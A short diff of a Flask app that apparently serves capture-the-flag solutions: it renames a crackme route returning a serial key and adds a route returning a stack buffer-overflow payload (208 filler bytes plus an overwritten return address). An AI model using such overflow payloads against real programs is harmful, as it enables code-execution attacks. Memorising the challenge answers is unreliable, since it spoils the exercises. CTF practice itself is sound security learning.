@@ -47,8 +47,12 @@ def solve_kazuma():
 
 # ctf
 @app.route('/payload_crackme', methods=['GET'])
-def solve_ctf():
+def solve_ctf_crack_me():
    return "111-1111111" 
+@app.route('/payload_stack', methods=['GET'])
+def solve_ctf_stack():
+   return b'A' * 208 + b'\xfa\x11\x40\x00'
+
     
 if __name__ == '__main__':
     app.run('0.0.0.0',port=5000)
